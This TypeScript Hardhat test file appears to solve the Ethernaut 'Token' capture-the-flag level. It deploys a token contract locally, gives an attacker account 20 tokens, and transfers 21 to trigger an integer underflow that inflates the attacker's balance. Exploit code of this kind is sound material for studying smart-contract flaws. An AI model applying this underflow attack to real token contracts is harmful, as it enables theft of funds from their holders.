import { ethers } from "hardhat";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { BigNumber } from "ethers";

// From TokenFactory contract
const SUPPLY = 21000000;
const PLAYER_SUPPLY = 20;
const AMOUNT_TO_TRANSFER = "21";

describe("Token exploit", () => {
  async function deployTokenFixture() {
    const [deployer, attacker, toAddress] = await ethers.getSigners();
    const Token = await ethers.getContractFactory("Token");
    const token = await Token.connect(deployer).deploy(SUPPLY);

    // You are given 20 tokens to start on Ethernaut. To simulate this, transfer 20 tokens from deployer to attacker
    token.connect(deployer).transfer(attacker.address, PLAYER_SUPPLY);

    return { attacker, attacker_2: toAddress, token };
  }

  it("Should get more tokens than specified", async () => {
    const { attacker, attacker_2, token } = await loadFixture(deployTokenFixture);

    // 20 - AMOUNT_TO_TRANSFER(21). This will underflow
    const tx = await token.connect(attacker).transfer(attacker_2.address, AMOUNT_TO_TRANSFER);
    tx.wait();

    const balanceAfter = await token.balanceOf(attacker.address);
    console.log(" Attacker ------------------------------------------------------------- ", balanceAfter.toString());
  });
});
